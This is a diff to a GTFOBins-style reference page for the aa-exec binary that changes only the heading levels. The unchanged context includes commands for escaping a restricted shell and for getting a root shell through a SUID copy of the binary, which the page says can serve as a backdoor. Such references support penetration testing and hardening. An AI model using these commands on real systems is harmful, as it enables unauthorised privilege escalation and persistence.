@@ -7,8 +7,7 @@ tags: [shell,suid,sudo]
 toc: false
 ---
 
-
-# Shell
+## Shell
 
 It can be used to break out from restricted environments by spawning an interactive system shell.
 
@@ -16,7 +15,7 @@ It can be used to break out from restricted environments by spawning an interact
 aa-exec /bin/sh
 ```
 
-# SUID
+## SUID
 
 If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.
 
@@ -28,7 +27,7 @@ sudo install -m =xs $(which aa-exec) .
 ./aa-exec /bin/sh -p
 ```
 
-# Sudo
+## Sudo
 
 If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 
